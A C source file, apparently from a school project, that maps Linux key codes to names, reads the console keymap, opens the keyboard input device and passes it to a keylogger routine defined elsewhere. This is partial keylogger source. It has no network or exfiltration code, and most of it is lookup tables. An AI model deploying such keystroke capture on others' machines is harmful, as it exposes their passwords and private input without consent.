/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <signal.h>
#include <linux/keyboard.h>
#include <linux/kd.h>
#include <errno.h>

#include "main.h"
#include "keys.h"

typedef struct 	s_event
{
	int			value;
	char 		*name;
}				t_event;

t_event	event[] = {
	{ EV_SYN, 				"EV_SYN" },
	{ EV_KEY, 				"EV_KEY" },
	{ EV_REL, 				"EV_REL" },
	{ EV_ABS, 				"EV_ABS" },
	{ EV_MSC, 				"EV_MSC" },
	{ EV_SW,				"EV_SW" },
	{ EV_LED,				"EV_LED" },
	{ EV_SND, 				"EV_SND" },
	{ EV_REP, 				"EV_REP" },
	{ EV_FF, 				"EV_FF" },
	{ EV_PWR, 				"EV_PWR" },
	{ EV_FF_STATUS, 		"EV_FF_STATUS" }
};

t_event msc[] = {
	{ MSC_SERIAL,			"MSC_SERIAL" },
	{ MSC_PULSELED,			"MSC_PULSELED" },
	{ MSC_GESTURE,			"MSC_GESTURE" },
	{ MSC_RAW,				"MSC_RAW" },
	{ MSC_SCAN,				"MSC_SCAN" },
	{ MSC_TIMESTAMP,		"MSC_TIMESTAMP" }
};

t_event led[] = {
	{ LED_NUML, 			"LED_NUML" },
	{ LED_CAPSL, 			"LED_CAPSL" },
	{ LED_SCROLLL, 			"LED_SCROLLL" },
	{ LED_COMPOSE, 			"LED_COMPOSE" },
	{ LED_KANA, 			"LED_KANA" },
	{ LED_SLEEP, 			"LED_SLEEP" },
	{ LED_SUSPEND, 			"LED_SUSPEND" },
	{ LED_MUTE, 			"LED_MUTE" },
	{ LED_MISC, 			"LED_MISC" },
	{ LED_MAIL, 			"LED_MAIL" },
	{ LED_CHARGING, 		"LED_CHARGING" }
};

t_event key[] = {
	{ KEY_RESERVED,			"RESERVED" },
	{ KEY_ESC,				"ESC" },
	{ KEY_1,				"1" },
	{ KEY_2,				"2" },
	{ KEY_3,				"3" },
	{ KEY_4,				"4" },
	{ KEY_5,				"5" },
	{ KEY_6,				"6" },
	{ KEY_7,				"7" },
	{ KEY_8,				"8" },
	{ KEY_9,				"9" },
	{ KEY_0,				"0" },
	{ KEY_MINUS,			"MINUS" },
	{ KEY_EQUAL,			"EQUAL" },
	{ KEY_BACKSPACE,		"BACKSPACE" },
	{ KEY_TAB,				"TAB" },
	{ KEY_Q,				"Q" },
	{ KEY_W,				"W" },
	{ KEY_E,				"E" },
	{ KEY_R,				"R" },
	{ KEY_T,				"T" },
	{ KEY_Y,				"Y" },
	{ KEY_U,				"U" },
	{ KEY_I,				"I" },
	{ KEY_O,				"O" },
	{ KEY_P,				"P" },
	{ KEY_LEFTBRACE,		"LEFTBRACE" },
	{ KEY_RIGHTBRACE,		"RIGHTBRACE" },
	{ KEY_ENTER,			"ENTER" },
	{ KEY_LEFTCTRL,			"LEFTCTRL" },
	{ KEY_A,				"A" },
	{ KEY_S,				"S" },
	{ KEY_D,				"D" },
	{ KEY_F,				"F" },
	{ KEY_G,				"G" },
	{ KEY_H,				"H" },
	{ KEY_J,				"J" },
	{ KEY_K,				"K" },
	{ KEY_L,				"L" },
	{ KEY_SEMICOLON,		"SEMICOLON" },
	{ KEY_APOSTROPHE,		"APOSTROPHE" },
	{ KEY_GRAVE,			"GRAVE" },
	{ KEY_LEFTSHIFT,		"LEFTSHIFT" },
	{ KEY_BACKSLASH,		"BACKSLASH" },
	{ KEY_Z,				"Z" },
	{ KEY_X,				"X" },
	{ KEY_C,				"C" },
	{ KEY_V,				"V" },
	{ KEY_B,				"B" },
	{ KEY_N,				"N" },
	{ KEY_M,				"M" },
	{ KEY_COMMA,			"COMMA" },
	{ KEY_DOT,				"DOT" },
	{ KEY_SLASH,			"SLASH" },
	{ KEY_RIGHTSHIFT,		"RIGHTSHIFT" },
	{ KEY_KPASTERISK,		"KPASTERISK" },
	{ KEY_LEFTALT,			"LEFTALT" },
	{ KEY_SPACE,			"SPACE" },
	{ KEY_CAPSLOCK,			"CAPSLOCK" },
	{ KEY_F1,				"F1" },
	{ KEY_F2,				"F2" },
	{ KEY_F3,				"F3" },
	{ KEY_F4,				"F4" },
	{ KEY_F5,				"F5" },
	{ KEY_F6,				"F6" },
	{ KEY_F7,				"F7" },
	{ KEY_F8,				"F8" },
	{ KEY_F9,				"F9" },
	{ KEY_F10,				"F10" },
	{ KEY_NUMLOCK,			"NUMLOCK" },
	{ KEY_SCROLLLOCK,		"SCROLLLOCK" },
	{ KEY_KP7,				"KP7" },
	{ KEY_KP8,				"KP8" },
	{ KEY_KP9,				"KP9" },
	{ KEY_KPMINUS,			"KPMINUS" },
	{ KEY_KP4,				"KP4" },
	{ KEY_KP5,				"KP5" },
	{ KEY_KP6,				"KP6" },
	{ KEY_KPPLUS,			"KPPLUS" },
	{ KEY_KP1,				"KP1" },
	{ KEY_KP2,				"KP2" },
	{ KEY_KP3,				"KP3" },
	{ KEY_KP0,				"KP0" },
	{ KEY_KPDOT,			"KPDOT" },
	{ 84,					"undefined" },
	{ KEY_ZENKAKUHANKAKU,	"ZENKAKUHANKAKU" },
	{ KEY_102ND,			"102ND" },
	{ KEY_F11,				"F11" },
	{ KEY_F12,				"F12" },
	{ KEY_RO,				"RO" },
	{ KEY_KATAKANA,			"KATAKANA" },
	{ KEY_HIRAGANA,			"HIRAGANA" },
	{ KEY_HENKAN,			"HENKAN" },
	{ KEY_KATAKANAHIRAGANA,	"KATAKANAHIRAGANA" },
	{ KEY_MUHENKAN,			"MUHENKAN" },
	{ KEY_KPJPCOMMA,		"KPJPCOMMA" },
	{ KEY_KPENTER,			"KPENTER" },
	{ KEY_RIGHTCTRL,		"RIGHTCTRL" },
	{ KEY_KPSLASH,			"KPSLASH" },
	{ KEY_SYSRQ,			"SYSRQ" },
	{ KEY_RIGHTALT,			"RIGHTALT" },
	{ KEY_LINEFEED,			"LINEFEED" },
	{ KEY_HOME,				"HOME" },
	{ KEY_UP,				"UP" },
	{ KEY_PAGEUP,			"PAGEUP" },
	{ KEY_LEFT,				"LEFT" },
	{ KEY_RIGHT,			"RIGHT" },
	{ KEY_END,				"END" },
	{ KEY_DOWN,				"DOWN" },
	{ KEY_PAGEDOWN,			"PAGEDOWN" },
	{ KEY_INSERT,			"INSERT" },
	{ KEY_DELETE,			"DELETE" },
	{ KEY_MACRO,			"MACRO" },
	{ KEY_MUTE,				"MUTE" },
	{ KEY_VOLUMEDOWN,		"VOLUMEDOWN" },
	{ KEY_VOLUMEUP,			"VOLUMEUP" },
	{ KEY_POWER,			"POWER" },
	{ KEY_KPEQUAL,			"KPEQUAL" },
	{ KEY_KPPLUSMINUS,		"KPPLUSMINUS" },
	{ KEY_PAUSE,			"PAUSE" },
	{ KEY_SCALE,			"SCALE" },
	{ KEY_KPCOMMA,			"KPCOMMA" },
	{ KEY_HANGEUL,			"HANGEUL" },
//	{ KEY_HANGUEL,			"HANGUEL" },
	{ KEY_HANJA,			"HANJA" },
	{ KEY_YEN,				"YEN" },
	{ KEY_LEFTMETA,			"LEFTMETA" },
	{ KEY_RIGHTMETA,		"RIGHTMETA" },
	{ KEY_COMPOSE,			"COMPOSE" },
	{ KEY_STOP,				"STOP" },
	{ KEY_AGAIN,			"AGAIN" },
	{ KEY_PROPS,			"PROPS" },
	{ KEY_UNDO,				"UNDO" },
	{ KEY_FRONT,			"FRONT" },
	{ KEY_COPY,				"COPY" },
	{ KEY_OPEN,				"OPEN" },
	{ KEY_PASTE,			"PASTE" },
	{ KEY_FIND,				"FIND" },
	{ KEY_CUT,				"CUT" },
	{ KEY_HELP,				"HELP" },
	{ KEY_MENU,				"MENU" },
	{ KEY_CALC,				"CALC" },
	{ KEY_SETUP,			"SETUP" },
	{ KEY_SLEEP,			"SLEEP" },
	{ KEY_WAKEUP,			"WAKEUP" },
	{ KEY_FILE,				"FILE" },
	{ KEY_SENDFILE,			"SENDFILE" },
	{ KEY_DELETEFILE,		"DELETEFILE" },
	{ KEY_XFER,				"XFER" },
	{ KEY_PROG1,			"PROG1" },
	{ KEY_PROG2,			"PROG2" },
	{ KEY_WWW,				"WWW" },
	{ KEY_MSDOS,			"MSDOS" },
	{ KEY_COFFEE,			"COFFEE" },
//	{ KEY_SCREENLOCK,		"SCREENLOCK" },
	{ KEY_ROTATE_DISPLAY,	"ROTATE_DISPLAY" },
//	{ KEY_DIRECTION,		"DIRECTION" },
	{ KEY_CYCLEWINDOWS,		"CYCLEWINDOWS" },
	{ KEY_MAIL,				"MAIL" },
	{ KEY_BOOKMARKS,		"BOOKMARKS" },
	{ KEY_COMPUTER,			"COMPUTER" },
	{ KEY_BACK,				"BACK" },
	{ KEY_FORWARD,			"FORWARD" },
	{ KEY_CLOSECD,			"CLOSECD" },
	{ KEY_EJECTCD,			"EJECTCD" },
	{ KEY_EJECTCLOSECD,		"EJECTCLOSECD" },
	{ KEY_NEXTSONG,			"NEXTSONG" },
	{ KEY_PLAYPAUSE,		"PLAYPAUSE" },
	{ KEY_PREVIOUSSONG,		"PREVIOUSSONG" },
	{ KEY_STOPCD,			"STOPCD" },
	{ KEY_RECORD,			"RECORD" },
	{ KEY_REWIND,			"REWIND" },
	{ KEY_PHONE,			"PHONE" },
	{ KEY_ISO,				"ISO" },
	{ KEY_CONFIG,			"CONFIG" },
	{ KEY_HOMEPAGE,			"HOMEPAGE" },
	{ KEY_REFRESH,			"REFRESH" },
	{ KEY_EXIT,				"EXIT" },
	{ KEY_MOVE,				"MOVE" },
	{ KEY_EDIT,				"EDIT" },
	{ KEY_SCROLLUP,			"SCROLLUP" },
	{ KEY_SCROLLDOWN,		"SCROLLDOWN" },
	{ KEY_KPLEFTPAREN,		"KPLEFTPAREN" },
	{ KEY_KPRIGHTPAREN,		"KPRIGHTPAREN" },
	{ KEY_NEW,				"NEW" },
	{ KEY_REDO,				"REDO" },
	{ KEY_F13,				"F13" },
	{ KEY_F14,				"F14" },
	{ KEY_F15,				"F15" },
	{ KEY_F16,				"F16" },
	{ KEY_F17,				"F17" },
	{ KEY_F18,				"F18" },
	{ KEY_F19,				"F19" },
	{ KEY_F20,				"F20" },
	{ KEY_F21,				"F21" },
	{ KEY_F22,				"F22" },
	{ KEY_F23,				"F23" },
	{ KEY_F24,				"F24" },
	{ 195,					"undefined" },
	{ 196,					"undefined" },
	{ 197,					"undefined" },
	{ 198,					"undefined" },
	{ 199,					"undefined" },
	{ KEY_PLAYCD,			"PLAYCD" },
	{ KEY_PAUSECD,			"PAUSECD" },
	{ KEY_PROG3,			"PROG3" },
	{ KEY_PROG4,			"PROG4" },
	{ KEY_DASHBOARD,		"DASHBOARD" },
	{ KEY_SUSPEND,			"SUSPEND" },
	{ KEY_CLOSE,			"CLOSE" },
	{ KEY_PLAY,				"PLAY" },
	{ KEY_FASTFORWARD,		"FASTFORWARD" },
	{ KEY_BASSBOOST,		"BASSBOOST" },
	{ KEY_PRINT,			"PRINT" },
	{ KEY_HP,				"HP" },
	{ KEY_CAMERA,			"CAMERA" },
	{ KEY_SOUND,			"SOUND" },
	{ KEY_QUESTION,			"QUESTION" },
	{ KEY_EMAIL,			"EMAIL" },
	{ KEY_CHAT,				"CHAT" },
	{ KEY_SEARCH,			"SEARCH" },
	{ KEY_CONNECT,			"CONNECT" },
	{ KEY_FINANCE,			"FINANCE" },
	{ KEY_SPORT,			"SPORT" },
	{ KEY_SHOP,				"SHOP" },
	{ KEY_ALTERASE,			"ALTERASE" },
	{ KEY_CANCEL,			"CANCEL" },
	{ KEY_BRIGHTNESSDOWN,	"BRIGHTNESSDOWN" },
	{ KEY_BRIGHTNESSUP,		"BRIGHTNESSUP" },
	{ KEY_MEDIA,			"MEDIA" },
	{ KEY_SWITCHVIDEOMODE,	"SWITCHVIDEOMODE" },
	{ KEY_KBDILLUMTOGGLE,	"KBDILLUMTOGGLE" },
	{ KEY_KBDILLUMDOWN,		"KBDILLUMDOWN" },
	{ KEY_KBDILLUMUP,		"KBDILLUMUP" },
	{ KEY_SEND,				"SEND" },
	{ KEY_REPLY,			"REPLY" },
	{ KEY_FORWARDMAIL,		"FORWARDMAIL" },
	{ KEY_SAVE,				"SAVE" },
	{ KEY_DOCUMENTS,		"DOCUMENTS" },
	{ KEY_BATTERY,			"BATTERY" },
	{ KEY_BLUETOOTH,		"BLUETOOTH" },
	{ KEY_WLAN,				"WLAN" },
	{ KEY_UWB,				"UWB" },
	{ KEY_UNKNOWN,			"UNKNOWN" },
	{ KEY_VIDEO_NEXT,		"VIDEO_NEXT" },
	{ KEY_VIDEO_PREV,		"VIDEO_PREV" },
	{ KEY_BRIGHTNESS_CYCLE,	"BRIGHTNESS_CYCLE" },
	{ KEY_BRIGHTNESS_AUTO,	"BRIGHTNESS_AUTO" },
//	{ KEY_BRIGHTNESS_ZERO,	"BRIGHTNESS_ZERO" },
	{ KEY_DISPLAY_OFF,		"DISPLAY_OFF" },
	{ KEY_WWAN,				"WWAN" },
//	{ KEY_WIMAX,			"WIMAX" },
	{ KEY_RFKILL,			"RFKILL" },
	{ KEY_MICMUTE,			"MICMUTE" },
	{ 249,					"undefined" },
	{ 250,					"undefined" },
	{ 251,					"undefined" },
	{ 252,					"undefined" },
	{ 253,					"undefined" },
	{ 254,					"undefined" },
	{ 255,					"undefined" }
};

typedef struct 	s_modifiers
{
	int 		value;
	int 		bit;
	char 		*name;
}				t_modifiers;

t_modifiers modifiers[] = {
	{ 0, 				KG_SHIFT,		"shift"},
	{ KEY_RIGHTALT, 	KG_ALTGR,		"altgr"},
	{ 0, 				KG_CTRL,		"control"},
	{ KEY_LEFTALT, 		KG_ALT,			"alt"},
	{ KEY_LEFTSHIFT, 	KG_SHIFTL,		"shiftl"},
	{ KEY_RIGHTSHIFT, 	KG_SHIFTR,		"shiftr"},
	{ KEY_LEFTCTRL, 	KG_CTRLL,		"ctrll"},
	{ KEY_RIGHTCTRL, 	KG_CTRLR,		"ctrlr"}
};

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

static void 		free_tab(int ***tab)
{
	int			**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

int					main(void)
{
	int				fd;
	int				nb_keys;
	int 			nb_keymap;
	int 			keymaps[2][MAX_NR_KEYMAPS];
	int				**key_table;
	char			*keyboard;

	if ((fd = get_console()) < 0)
		return 1;
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((nb_keymap = get_keymaps(fd, keymaps)) == 0)
		return 1;
	key_table = get_keys(fd, nb_keys, nb_keymap, keymaps);
	close(fd);
	if (key_table == NULL)
		return 1;
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return 1;
	}
	if ((fd = open(keyboard, O_RDONLY)) < 0) {
		free(keyboard);
		free_tab(&key_table);
		return 1;
	}
	printf("keyboard: %s\n", keyboard);
	free(keyboard);
	keylogger(fd, key_table);
	close(fd);
	free_tab(&key_table);
	return 0;
}
